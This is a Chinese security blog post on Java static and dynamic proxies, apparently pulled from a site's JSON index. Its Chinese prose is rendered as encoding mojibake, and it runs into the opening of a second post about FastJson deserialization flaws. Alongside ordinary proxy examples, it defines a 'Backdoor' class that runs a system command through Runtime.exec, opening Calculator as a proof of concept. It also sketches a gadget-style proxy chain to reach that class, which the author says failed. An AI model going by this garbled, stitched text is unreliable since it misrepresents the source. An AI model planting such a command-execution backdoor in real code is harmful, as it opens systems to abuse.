èƒ½å¤Ÿå‘ç°å…¶å®å®ç°ä»£ç†æ¨¡å¼éœ€è¦ä¸‰ä¸ªä¸œè¥¿ï¼šä¸€ä¸ªå…¬å…±æ¥å£ï¼Œä¸€ä¸ªå…·ä½“çš„ç±»ï¼Œä¸€ä¸ªä»£ç†ç±»,ä»£ç†ç±»æŒæœ‰å…·ä½“ç±»çš„å®ä¾‹ï¼Œä»£ä¸ºæ‰§è¡Œå…·ä½“ç±»å®ä¾‹æ–¹æ³•ã€‚\næ­¤å¤–ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ä»£ç†æ¨¡å¼çš„ä¸»è¦è§’è‰²\næŠ½è±¡è§’è‰²ï¼ˆSubjectï¼‰ï¼šé€šè¿‡æ¥å£æˆ–æŠ½è±¡ç±»å£°æ˜çœŸå®ä¸»é¢˜å’Œä»£ç†å¯¹è±¡å®ç°çš„ä¸šåŠ¡æ–¹æ³•ã€‚ çœŸå®è§’è‰²ï¼ˆReal Subjectï¼‰ï¼šå®ç°äº†æŠ½è±¡ä¸»é¢˜ä¸­çš„å…·ä½“ä¸šåŠ¡ï¼Œæ˜¯ä»£ç†å¯¹è±¡æ‰€ä»£è¡¨çš„çœŸå®å¯¹è±¡ï¼Œæ˜¯æœ€ç»ˆè¦å¼•ç”¨çš„å¯¹è±¡ã€‚ ä»£ç†ï¼ˆProxyï¼‰ï¼šæä¾›äº†ä¸çœŸå®ä¸»é¢˜ç›¸åŒçš„æ¥å£ï¼Œå…¶å†…éƒ¨å«æœ‰å¯¹çœŸå®ä¸»é¢˜çš„å¼•ç”¨ï¼Œå®ƒå¯ä»¥è®¿é—®ã€æ§åˆ¶æˆ–æ‰©å±•çœŸå®ä¸»é¢˜çš„åŠŸèƒ½ã€‚ å®¢æˆ· : ä½¿ç”¨ä»£ç†è§’è‰²æ¥è¿›è¡Œä¸€äº›æ“ä½œã€‚ ä»£ç†æ¨¡å¼çš„ä¼˜ç‚¹ï¼š\nä»£ç†æ¨¡å¼åœ¨å®¢æˆ·ç«¯ä¸ç›®æ ‡å¯¹è±¡ä¹‹é—´èµ·åˆ°ä¸€ä¸ªä¸­ä»‹ä½œç”¨å’Œä¿æŠ¤ç›®æ ‡å¯¹è±¡çš„ä½œç”¨ ä»£ç†å¯¹è±¡å¯ä»¥æ‰©å±•ç›®æ ‡å¯¹è±¡çš„åŠŸèƒ½ ä»£ç†æ¨¡å¼èƒ½å°†å®¢æˆ·ç«¯ä¸ç›®æ ‡å¯¹è±¡åˆ†ç¦»ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šé™ä½äº†ç³»ç»Ÿçš„è€¦åˆåº¦ï¼Œå¢åŠ äº†ç¨‹åºçš„å¯æ‰©å±•æ€§ è¿™é‡Œï¼Œæˆ‘ä»¬ä¹Ÿèƒ½å¤Ÿæ˜ç™½ï¼Œä»£ç†çš„ä½œç”¨å°±æ˜¯èµ·ä¸€ä¸ªä¸­é—´ä»¶çš„ä½œç”¨ï¼Œå°†å‘é€ç»™å…·ä½“ç±»çš„æ¶ˆæ¯è¿›è¡Œå¤„ç†ï¼Œæ˜¯Springé‡Œé¢AOPæ€æƒ³çš„åŸºç¡€ã€‚\n0x02 é™æ€ä»£ç† è¿™ç§ä»£ç†æ–¹å¼éœ€è¦ä»£ç†å¯¹è±¡å’Œç›®æ ‡å¯¹è±¡å®ç°ä¸€æ ·çš„æ¥å£ã€‚ä½†æ˜¯å½“éœ€è¦ä»£ç†çš„å¯¹è±¡è¿‡å¤šå°±éœ€è¦å®ç°å¤§é‡çš„ä»£ç†ç±»ï¼Œå¹¶ä¸”ä¸€æ—¦æ¥å£å¢åŠ æ–¹æ³•ï¼Œç›®æ ‡å¯¹è±¡ä¸ä»£ç†å¯¹è±¡éƒ½è¦è¿›è¡Œä¿®æ”¹ã€‚\nä¸‹é¢ä»¥ä¸€ä¸ªå‡ºç§Ÿæˆ¿å­ä¸ºä¾‹å­:\næŠ½è±¡è§’è‰²ï¼šæ¥å£Rent\n1 2 3 public interface Rent { public void rent(); } çœŸå®è§’è‰²ï¼šæˆ¿ä¸œå‡ºç§Ÿæˆ¿å­landLord\n1 2 3 4 5 6 public class landLord implements Rent{ @Override public void rent() { System.out.println(\u0026#34;æˆ¿å±‹å‡ºç§Ÿ\u0026#34;); } } ä»£ç†ï¼šä¸­ä»‹(é™æ€ä»£ç†) StaticProxy 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public class StaticProxy implements Rent{ private landLord landLord; public StaticProxy() { } public StaticProxy(com.reus.landLord landLord) { this.landLord = landLord; } public void seeHouse(){ System.out.println(\u0026#34;çœ‹æˆ¿å­\u0026#34;); } public void fare(){ System.out.println(\u0026#34;ä¸­ä»‹è´¹ç”¨\u0026#34;); } @Override public void rent() { seeHouse(); landLord.rent(); fare(); } } Client:å®¢æˆ·\n1 2 3 4 5 6 7 System.out.println(\u0026#34;é™æ€ä»£ç†\u0026#34;); //æˆ¿ä¸œè¦ç§Ÿæˆ¿ landLord landlord = new landLord(); //ä¸­ä»‹å¸®åŠ©æˆ¿ä¸œ StaticProxy staticProxy = new StaticProxy(landlord); //å®¢æˆ·æ‰¾ä¸­ä»‹ staticProxy.rent(); åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå®¢æˆ·æ¥è§¦çš„æ˜¯ä¸­ä»‹ï¼Œçœ‹ä¸åˆ°æˆ¿ä¸œï¼Œä½†æ˜¯ä¾æ—§ç§Ÿåˆ°äº†æˆ¿ä¸œçš„æˆ¿å­ã€‚åŒæ—¶æˆ¿ä¸œçœäº†å¿ƒï¼Œå®¢æˆ·çœäº†äº‹ã€‚\nä½†æ˜¯ä½ èƒ½å¾ˆæ˜æ˜¾çš„æ„Ÿå—è¿™æ ·çš„æ¨¡å¼å®Œæˆä»£ç†ä¸€ä¸ªç±»æ˜¯å¾ˆå®¹æ˜“çš„ï¼Œä½†å¦‚æœéœ€è¦ä»£ç†çš„ç±»å¾ˆå¤šï¼Œé‚£ä¹ˆå°±éœ€è¦ç¼–å†™å¤§é‡çš„ä»£ç†ç±»ï¼Œæ¯”è¾ƒç¹çã€‚å¹¶ä¸”å½“æ¥å£è¢«æ”¹å˜ä»£ç†ç±»åŒæ ·éœ€è¦æ”¹å˜ï¼Œè¿™æ ·å°±äº§ç”Ÿäº†æ›´å¤§çš„å±€é™æ€§å’Œæ›´å¤šéº»çƒ¦ã€‚\nç”±æ­¤å¯ä»¥æˆ‘ä»¬å¾—çŸ¥æ­¤é™æ€ä»£ç†çš„ç¼ºç‚¹ï¼š\nå½“æˆ‘ä»¬çš„æ¥å£ç±»éœ€è¦å¢åŠ å’Œåˆ é™¤æ–¹å¼çš„æ—¶å€™ï¼Œå§”æ‰˜ç±»å’Œä»£ç†ç±»éƒ½éœ€è¦æ›´æ”¹ï¼Œä¸å®¹æ˜“ç»´æŠ¤ã€‚\nåŒæ—¶å¦‚æœéœ€è¦ä»£ç†å¤šä¸ªç±»çš„æ—¶å€™ï¼Œæ¯ä¸ªå§”æ‰˜ç±»éƒ½è¦ç¼–å†™ä¸€ä¸ªä»£ç†ç±»ï¼Œä¼šå¯¼è‡´ä»£ç†ç±»ç¹å¤šï¼Œä¸å¥½ç®¡ç†ã€‚\nå› ä¸ºjavaé™æ€ä»£ç†æ˜¯å¯¹ç±»è¿›è¡Œæ“ä½œçš„ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªä¸ªä»£ç†ç±»å»å®ç°å¯¹å§”æ‰˜ç±»çš„æ›´æ”¹æ“ä½œï¼Œé’ˆå¯¹è¿™ä¸ªæƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨åŠ¨æ€ä»£ç†æ¥è§£å†³ï¼Œé€šè¿‡ç¨‹åºè¿è¡Œæ—¶è‡ªåŠ¨ç”Ÿæˆä»£ç†ç±»ã€‚\n0x03 åŠ¨æ€ä»£ç† JavaåŠ¨æ€ä»£ç†ä½äºJava.lang.reflectåŒ…ä¸‹ï¼Œæˆ‘ä»¬ä¸€èˆ¬å°±ä»…æ¶‰åŠJava.lang.reflect.Proxyç±»ä¸InvocationHandleræ¥å£,ä½¿ç”¨å…¶é…åˆåå°„ï¼Œå®Œæˆå®ç°åŠ¨æ€ä»£ç†çš„æ“ä½œã€‚\nInvocationHandleræ¥å£ï¼šè´Ÿè´£æä¾›è°ƒç”¨ä»£ç†æ“ä½œã€‚\næ˜¯ç”±ä»£ç†å¯¹è±¡è°ƒç”¨å¤„ç†å™¨å®ç°çš„æ¥å£ï¼Œå®šä¹‰äº†ä¸€ä¸ªinvoke()æ–¹æ³•ï¼Œæ¯ä¸ªä»£ç†å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªå…³è”çš„æ¥å£ã€‚å½“ä»£ç†å¯¹è±¡ä¸Šè°ƒç”¨æ–¹æ³•æ—¶ï¼Œè¯¥æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è½¬å‘åˆ°InvocationHandler.invoke()æ–¹æ³•æ¥è¿›è¡Œè°ƒç”¨ã€‚\nProxyç±»ï¼šè´Ÿè´£åŠ¨æ€æ„å»ºä»£ç†ç±»\næä¾›å››ä¸ªé™æ€æ–¹æ³•æ¥ä¸ºä¸€ç»„æ¥å£åŠ¨æ€ç”Ÿæˆçš„ä»£ç†ç±»å¹¶è¿”å›ä»£ç†ç±»çš„å®ä¾‹å¯¹è±¡ã€‚\ngetProxyClass(ClassLoader,Class\u0026lt;?\u0026gt;...)ï¼šè·å–æŒ‡å®šç±»åŠ è½½å™¨å’ŒåŠ¨æ€ä»£ç†ç±»å¯¹è±¡ã€‚\nnewProxyInstance(ClassLoader,Class\u0026lt;?\u0026gt;[],InvocationHandler)ï¼šæŒ‡å®šç±»åŠ è½½å™¨ï¼Œä¸€ç»„æ¥å£ï¼Œè°ƒç”¨å¤„ç†å™¨ï¼›\nisProxyClass(Class\u0026lt;?\u0026gt;)ï¼šåˆ¤æ–­è·å–çš„ç±»æ˜¯å¦ä¸ºä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»;\ngetInvocationHandler(Object)ï¼šè·å–æŒ‡å®šä»£ç†ç±»å®ä¾‹æŸ¥æ‰¾ä¸å®ƒç›¸å…³è”çš„è°ƒç”¨å¤„ç†å™¨å®ä¾‹;\nåŠ¨æ€ä»£ç†å®ç°è¿‡ç¨‹\nä½¿ç”¨java.lang.InvocationHandleræ¥å£åˆ›å»ºè‡ªå®šä¹‰è°ƒç”¨å¤„ç†å™¨ï¼Œç”±å®ƒæ¥å®ç°invokeæ–¹æ³•ï¼Œæ‰§è¡Œä»£ç†å‡½æ•°ï¼›\nä½¿ç”¨java.lang.reflect.Proxyç±»æŒ‡å®šä¸€ä¸ªClassLoaderï¼Œä¸€ç»„interfaceæ¥å£å’Œä¸€ä¸ªInvocationHandlerï¼›\né€šè¿‡åå°„æœºåˆ¶è·å¾—åŠ¨æ€ä»£ç†ç±»çš„æ„é€ æ–¹æ³•ï¼Œå…¶å”¯ä¸€å‚æ•°ç±»å‹æ˜¯è°ƒç”¨å¤„ç†å™¨æ¥å£ç±»å‹ï¼›\nè°ƒç”¨java.lang.reflect.Proxy.newProxyInstance()æ–¹æ³•ï¼Œåˆ†åˆ«ä¼ å…¥ç±»åŠ è½½å™¨ï¼Œè¢«ä»£ç†æ¥å£ï¼Œè°ƒç”¨å¤„ç†å™¨ï¼›åˆ›å»ºåŠ¨æ€ä»£ç†å®ä¾‹å¯¹è±¡ã€‚\nå®ƒä¸‰ä¸ªå‚æ•°çš„æ„ä¹‰å¦‚ä¸‹ï¼š\nloaderï¼ŒæŒ‡å®šä»£ç†å¯¹è±¡çš„ç±»åŠ è½½å™¨ interfacesï¼Œä»£ç†å¯¹è±¡éœ€è¦å®ç°çš„æ¥å£ï¼Œå¯ä»¥åŒæ—¶æŒ‡å®šå¤šä¸ªæ¥å£ handlerï¼Œæ–¹æ³•è°ƒç”¨çš„å®é™…å¤„ç†è€…ï¼Œä»£ç†å¯¹è±¡çš„æ–¹æ³•è°ƒç”¨éƒ½ä¼šè½¬å‘åˆ°è¿™é‡Œ Proxy.newProxyInstanceä¼šè¿”å›ä¸€ä¸ªå®ç°äº†æŒ‡å®šæ¥å£çš„ä»£ç†å¯¹è±¡ï¼Œå¯¹è¯¥å¯¹è±¡çš„æ‰€æœ‰æ–¹æ³•è°ƒç”¨éƒ½ä¼šè½¬å‘ç»™InvocationHandler.invoke()æ–¹æ³•ã€‚\nå› æ­¤ï¼Œåœ¨invoke()æ–¹æ³•é‡Œæˆ‘ä»¬å¯ä»¥åŠ å…¥ä»»ä½•é€»è¾‘ï¼Œæ¯”å¦‚ä¿®æ”¹æ–¹æ³•å‚æ•°ï¼ŒåŠ å…¥æ—¥å¿—åŠŸèƒ½ã€å®‰å…¨æ£€æŸ¥åŠŸèƒ½ç­‰ç­‰ç­‰ç­‰â€¦â€¦\né€šè¿‡ä»£ç†å¯¹è±¡è°ƒç”¨ç›®æ ‡æ–¹æ³•ï¼›\næˆ‘ä»¬è¿˜æ˜¯ä½¿ç”¨é™æ€ä»£ç†ç»™çš„æ¥å£ç±»å’Œå§”æ‰˜ç±»ã€‚\nä»£ç†:ä¸­ä»‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public class DynamicProxy implements InvocationHandler { // targetå˜é‡ä¸ºå§”æ‰˜ç±»å¯¹è±¡ private Object target; public DynamicProxy(Object target) { this.target = target; } public void seeHouse(){ System.out.println(\u0026#34;çœ‹æˆ¿å­\u0026#34;); } public void fare(){ System.out.println(\u0026#34;ä¸­ä»‹è´¹ç”¨\u0026#34;); } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { seeHouse(); Object result = method.invoke(target,args); fare(); return result; } public Object getProxy(){ return Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(),this); } } Client è°ƒç”¨:\n1 2 3 4 System.out.println(\u0026#34;åŠ¨æ€ä»£ç†\u0026#34;); DynamicProxy dynamicProxy = new DynamicProxy(landlord); Rent proxy = (Rent) dynamicProxy.getProxy(); proxy.rent(); é€šè¿‡å¼€å¯System.getProperties().put(\u0026quot;sun.misc.ProxyGenerator.saveGeneratedFiles\u0026quot;,\u0026quot;true\u0026quot;);æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹åŠ¨æ€ä»£ç†è¿‡ç¨‹ä¸­ç”Ÿæˆçš„å­—èŠ‚ç æ–‡ä»¶ï¼Œæ”¾åœ¨è·Ÿç›®å½•ä¸‹:com.sun.proxy.$Proxy0.class\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 package com.sun.proxy; import com.reus.Rent; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; import java.lang.reflect.UndeclaredThrowableException; public final class $Proxy0 extends Proxy implements Rent { // ç§æœ‰é™æ€æ„é€ æ–¹æ³• private static Method m1; private static Method m3; private static Method m2; private static Method m0; // è·å–è°ƒç”¨å¤„ç†å™¨å®ä¾‹å¯¹è±¡ public $Proxy0(InvocationHandler var1) throws { super(var1); } public final boolean equals(Object var1) throws { try { return (Boolean)super.h.invoke(this, m1, new Object[]{var1}); } catch (RuntimeException | Error var3) { throw var3; } catch (Throwable var4) { throw new UndeclaredThrowableException(var4); } } // è·å–è°ƒç”¨æ¥å£ç±»çš„rent()æ–¹æ³•,è½¬å‘åˆ°è°ƒç”¨å¤„ç†å™¨ä¸­çš„invoke()æ–¹æ³•è¿›è¡Œå¤„ç†ã€‚ public final void rent() throws { try { super.h.invoke(this, m3, (Object[])null); } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } public final String toString() throws { try { return (String)super.h.invoke(this, m2, (Object[])null); } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } public final int hashCode() throws { try { return (Integer)super.h.invoke(this, m0, (Object[])null); } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } // åˆ©ç”¨åå°„è¿›è¡Œç±»åˆå§‹åŒ–ï¼Œæ‰§è¡Œstaticé™æ€ä»£ç å—ä¸­çš„å†…å®¹ï¼Œä¸»è¦æ˜¯è·å–com.DynamicProxy.Rentalæ¥å£ç±»ä¸­çš„saleæ–¹æ³•ã€‚ static { try { m1 = Class.forName(\u0026#34;java.lang.Object\u0026#34;).getMethod(\u0026#34;equals\u0026#34;, Class.forName(\u0026#34;java.lang.Object\u0026#34;)); m3 = Class.forName(\u0026#34;com.reus.Rent\u0026#34;).getMethod(\u0026#34;rent\u0026#34;); m2 = Class.forName(\u0026#34;java.lang.Object\u0026#34;).getMethod(\u0026#34;toString\u0026#34;); m0 = Class.forName(\u0026#34;java.lang.Object\u0026#34;).getMethod(\u0026#34;hashCode\u0026#34;); } catch (NoSuchMethodException var2) { throw new NoSuchMethodError(var2.getMessage()); } catch (ClassNotFoundException var3) { throw new NoClassDefFoundError(var3.getMessage()); } } } åœ¨è¿™é‡Œç”Ÿæˆçš„$Proxy0ä»£ç±»ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ¸…æ¥šçŸ¥é“åŠ¨æ€ä»£ç†çš„å®ç°è¿‡ç¨‹ã€‚å®é™…ä¸Šæˆ‘ä»¬åœ¨åˆ›å»ºä»£ç†å¯¹è±¡æ—¶ï¼Œå°±æ˜¯é€šè¿‡é€šè¿‡åå°„æ¥è·å–è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ï¼Œç„¶åæ¥åˆ›å»ºçš„ä»£ç†å®ä¾‹ã€‚\n0x04 ç®€å•åˆ©ç”¨ èƒŒæ™¯ å­˜åœ¨ä¸€ä¸ªæ¥å£teacher:\n1 2 3 4 public interface Teacher { Object getObject(); void attack(); } æœ‰ä¸€ä¸ªå®ç°å…¬å…±æ¥å£çš„ç±»Aå’Œä¸€ä¸ªåé—¨ç±»\nA:\n1 2 3 4 5 6 7 8 9 10 11 12 public class A implements Teacher{ Object object; @Override public Object getObject() { return null; } @Override public void attack() { System.out.println(\u0026#34;attack\u0026#34;); } } backdoor:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.io.IOException; public class Backdoor implements Teacher{ @Override public Object getObject() { return null; } @Override public void attack() { try { Runtime.getRuntime().exec(\u0026#34;open /System/Applications/Calculator.app\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } } proxyHandlerä»£ç†ç±»:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; public class ProxyHandler implements InvocationHandler { private A object; public ProxyHandler(Object object){ this.object = (A) object; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(\u0026#34;method is \u0026#34; + method.getName()); method.invoke(this.object.getObject(), args); return null; } } myPrxoy\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; public class myProxy implements InvocationHandler { private Object object; public myProxy(Object o){ this.object = o; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { return this.object; } } åˆ©ç”¨ å¾ˆæ˜æ˜¾æˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„æ˜¯éœ€è¦è°ƒç”¨åˆ°åé—¨ç±»é‡Œé¢çš„attackæ–¹æ³•ã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ProxyHandler.invoke()ä¸­è®©this.object.getObject()èƒ½å¤Ÿè¿”å›ä¸€ä¸ªBackdooråé—¨ç±»å®ä¾‹å¯¹è±¡å°±èƒ½å®Œæˆattackæ–¹æ³•è°ƒç”¨ã€‚\nè¿™é‡Œçš„é€šå¸¸åšæ³•å°±æ˜¯èƒ½å¤Ÿå¯»æ‰¾åˆ°ä¸€ä¸ªæ–°çš„ä»£ç†ï¼Œæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶è¿™ä¸ªä»£ç†çš„invokeè¿”å›å¯¹è±¡ï¼Œç„¶åç”¨å®ƒæ¥ä»£ç†ProxyHandlerä¸­çš„objectï¼Œå½“è°ƒç”¨åˆ°this.object.getObject()è¿›å…¥åˆ°æˆ‘ä»¬æ‰¾çš„å¯åˆ©ç”¨çš„ä»£ç†å¯¹è±¡ä¸­æ§åˆ¶è¿”å›å¯¹è±¡ä¸ºä¸€ä¸ªBackdooråé—¨ç±»å®ä¾‹ã€‚æ‰€ä»¥å¾ˆæ˜æ˜¾è¿™é‡Œçš„myProxyå°±æ˜¯é‚£ä¸ªæ–°çš„ä»£ç†ã€‚\nä½†æ˜¯å¥½åƒæ²¡æœ‰è°ƒè¯•å‡ºæ¥ï¼Œä¹‹åå†çœ‹çœ‹(x\næ€»ç»“ äº†è§£Javaä»£ç†çš„ä¸€äº›çŸ¥è¯†ï¼Œå…¶å®åŠ¨æ€ä»£ç†åœ¨ä¸€äº›POCã€EXPçš„ç¼–å†™ä¸­ç”¨çš„è¿˜æ˜¯æ¯”è¾ƒå¤šçš„ï¼ŒåŒæ—¶å¯¹åé¢RMIå’ŒJDNIæ³¨å…¥å­¦ä¹ ä¹Ÿæœ‰å¾ˆå¤§å¸®åŠ©ã€‚ä¹‹åä¼šè¿›ä¸€æ­¥åˆ†æä¸€äº›åˆ©ç”¨é“¾æ¥è¿›ä¸€æ­¥åˆ†æã€‚\nReference https://www.cnblogs.com/aduner/p/14646877.html https://xz.aliyun.com/t/9197#toc-2 https://tttang.com/archive/1769/#toc_java ","permalink":"http://www.reus09.top/posts/tech/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/","summary":"å®é™…ä¸Šåœ¨ä¹‹å‰çš„å­¦ä¹ é˜¶æ®µå¤ç°äº†ä¸€äº›CVEæ¼æ´ï¼Œä½†æ˜¯å‘ç°è¿˜æ˜¯å­˜åœ¨åŸºç¡€æ–¹é¢çš„ç¼ºé™·ï¼Œå¯¹Javaå®‰å…¨ç¼ºä¹ç³»ç»Ÿæ€§çš„æ•´ç†ï¼Œå› æ­¤ä»ä»Šå¤©è¿™ç¯‡å¼€å§‹ï¼Œç³»ç»Ÿçš„æ•´ç†å­¦","title":"Javaä¹‹åŠ¨æ€ä»£ç†"},{"content":"å®é™…ä¸Šï¼Œå‰ä¸ä¹…åˆšåˆšåˆ†æäº†FastJson1.2.80æ¼æ´ï¼Œä¸€æ–¹é¢å¯¹Javaååºåˆ—åŒ–æ¼æ´æœ‰äº†ä¸€ä¸ªåˆæ­¥çš„äº†è§£ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–ï¼Œå¹¶ä¸”è¿™ä¸ªç±»é‡Œé¢çš„æˆå‘˜ä¹Ÿå­˜åœ¨å¯æ§ï¼Œå°±å¯ä»¥æ³¨å…¥æ¶æ„JSONå®ç°ååºåˆ—æ¼æ´ï¼Œå¦ä¸€æ–¹é¢ç”±äºFastJson1.2.25ä¹‹åéƒ½æ˜¯å¯¹AutoTypeæœºåˆ¶è¿›è¡Œç»•è¿‡ï¼Œæ‰€ä»¥ä¹Ÿç®€å•å­¦ä¹ äº†AutoTypeCheckæœºåˆ¶ï¼Œè¿˜æœ‰ä¸€äº›æœŸæœ›ç±»çš„Gadgetã€‚æœ¬æ–‡ä¸»è¦å¯¹FastJsonå¸¸ç”¨çš„çš„è§£æStringçš„parse,parseObjectç­‰æ–¹æ³•è¿›è¡Œåˆ†æï¼Œç„¶ååˆ†æAutoTypeCheckæœºåˆ¶ï¼ŒåŒæ—¶ä¹Ÿå¯¹FastJsonå†å²æ¼æ´è¿›è¡Œç®€å•çš„æ•´ç†ã€‚\næ¼æ´ä»‹ç» è¿™é‡Œå°±å†ä»‹ç»ä¸€ä¸‹FastJsonçš„èƒŒæ™¯ã€‚\nfastjson æ˜¯é˜¿é‡Œå·´å·´çš„å¼€æº JSON è§£æåº“ï¼Œå®ƒå¯ä»¥è§£æ JSON æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°† Java Bean åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä» JSON å­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ° JavaBeanã€‚\nç”±äºå…¶ç‰¹ç‚¹æ˜¯å¿«ï¼Œä»¥æ€§èƒ½ä¸ºä¼˜åŠ¿å¿«é€Ÿå é¢†äº†å¤§é‡ç”¨æˆ·ï¼Œå¹¶ä¸”å…¶ API ååˆ†ç®€æ´ï¼Œç”¨æˆ·é‡ååˆ†åºå¤§ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†è¿™æ ·çš„ç»„ä»¶ä¸€æ—¦çˆ†å‡ºæ¼æ´ï¼Œå±å®³ä¹Ÿå°†ä¼šæ˜¯å·¨å¤§çš„ï¼Œå› æ­¤ï¼Œfastjson ä»ç¬¬ä¸€æ¬¡æŠ¥å‘Šå®‰å…¨æ¼æ´è‡³ä»Šï¼Œè¿›è¡Œäº†è‹¥å¹²æ¬¡çš„å®‰å…¨æ›´æ–°ï¼Œä¹Ÿä¸å®‰å…¨ç ”ç©¶äººå‘˜è¿›è¡Œäº†æ¥æ¥å›å›å¤šæ¬¡çš„å®‰å…¨è¡¥ä¸-ç»•è¿‡çš„æµç¨‹ã€‚\nè¿™é‡Œæ”¾ä¸€ä¸‹æ¡†æ¶å›¾\nä¸»è¦åŠŸèƒ½åœ¨DefaultJSONParserç±»ä¸­å®ç°çš„ï¼Œåœ¨è¿™ä¸ªç±»ä¸­ä¼šåº”ç”¨å…¶ä»–çš„ä¸€äº›å¤–éƒ¨ç±»æ¥å®Œæˆåç»­æ“ä½œã€‚ParserConfigä¸»è¦æ˜¯è¿›è¡Œé…ç½®ä¿¡æ¯çš„åˆå§‹åŒ–ï¼ŒJSONLexerä¸»è¦æ˜¯å¯¹jsonå­—ç¬¦ä¸²è¿›è¡Œå¤„ç†å¹¶åˆ†æï¼Œååºåˆ—åŒ–åœ¨JavaBeanDeserializerä¸­å¤„ç†ã€‚\nååºåˆ—åŒ–æ–¹æ³• å°† json æ•°æ®ååºåˆ—åŒ–æ—¶å¸¸ä½¿ç”¨çš„æ–¹æ³•ä¸ºparse()ã€parseObject()ã€parseArray()ï¼Œè¿™ä¸‰ä¸ªæ–¹æ³•ä¹Ÿå‡åŒ…å«è‹¥å¹²é‡è½½æ–¹æ³•ï¼Œå¸¦æœ‰ä¸åŒå‚æ•°ï¼š\nååºåˆ—åŒ–ç‰¹æ€§ï¼šcom.alibaba.fastjson.parser.Featureï¼Œ ç±»çš„ç±»å‹ï¼šjava.lang.reflect.Typeï¼Œç”¨æ¥æ‰§è¡Œååºåˆ—åŒ–ç±»çš„ç±»å‹ã€‚ å¤„ç†æ³›å‹ååºåˆ—åŒ–ï¼šcom.alibaba.fastjson.TypeReferenceã€‚ ç¼–ç¨‹æ‰©å±•å®šåˆ¶ååºåˆ—åŒ–ï¼šcom.alibaba.fastjson.parser.deserializer.ParseProcessï¼Œä¾‹å¦‚ExtraProcessor ç”¨äºå¤„ç†å¤šä½™çš„å­—æ®µï¼ŒExtraTypeProvider ç”¨äºå¤„ç†å¤šä½™å­—æ®µæ—¶æä¾›ç±»å‹ä¿¡æ¯ã€‚ è¿™é‡Œåˆ—ä¸¾ä¸€äº› fastjson åŠŸèƒ½è¦ç‚¹ï¼š\nä½¿ç”¨ JSON.parse(jsonString) å’Œ JSON.parseObject(jsonString, Target.class)ï¼Œä¸¤è€…è°ƒç”¨é“¾ä¸€è‡´ï¼Œå‰è€…ä¼šåœ¨ jsonString ä¸­è§£æå­—ç¬¦ä¸²è·å– @type æŒ‡å®šçš„ç±»ï¼Œåè€…åˆ™ä¼šç›´æ¥ä½¿ç”¨å‚æ•°ä¸­çš„classã€‚ fastjson åœ¨åˆ›å»ºä¸€ä¸ªç±»å®ä¾‹æ—¶ä¼šé€šè¿‡åå°„è°ƒç”¨ç±»ä¸­ç¬¦åˆæ¡ä»¶çš„ getter/setter æ–¹æ³•ï¼Œå…¶ä¸­ getter æ–¹æ³•éœ€æ»¡è¶³æ¡ä»¶ï¼šæ–¹æ³•åé•¿äº 4ã€ä¸æ˜¯é™æ€æ–¹æ³•ã€ä»¥ get å¼€å¤´ä¸”ç¬¬4ä½æ˜¯å¤§å†™å­—æ¯ã€æ–¹æ³•ä¸èƒ½æœ‰å‚æ•°ä¼ å…¥ã€ç»§æ‰¿è‡ª Collection|Map|AtomicBoolean|AtomicInteger|AtomicLongã€æ­¤å±æ€§æ²¡æœ‰ setter æ–¹æ³•ï¼›setter æ–¹æ³•éœ€æ»¡è¶³æ¡ä»¶ï¼šæ–¹æ³•åé•¿äº 4ï¼Œä»¥ set å¼€å¤´ä¸”ç¬¬4ä½æ˜¯å¤§å†™å­—æ¯ã€éé™æ€æ–¹æ³•ã€è¿”å›ç±»å‹ä¸º void æˆ–å½“å‰ç±»ã€å‚æ•°ä¸ªæ•°ä¸º 1 ä¸ªã€‚å…·ä½“é€»è¾‘åœ¨ com.alibaba.fastjson.util.JavaBeanInfo.build() ä¸­ã€‚ ä½¿ç”¨ JSON.parseObject(jsonString) å°†ä¼šè¿”å› JSONObject å¯¹è±¡ï¼Œä¸”ç±»ä¸­çš„æ‰€æœ‰ getter ä¸setter 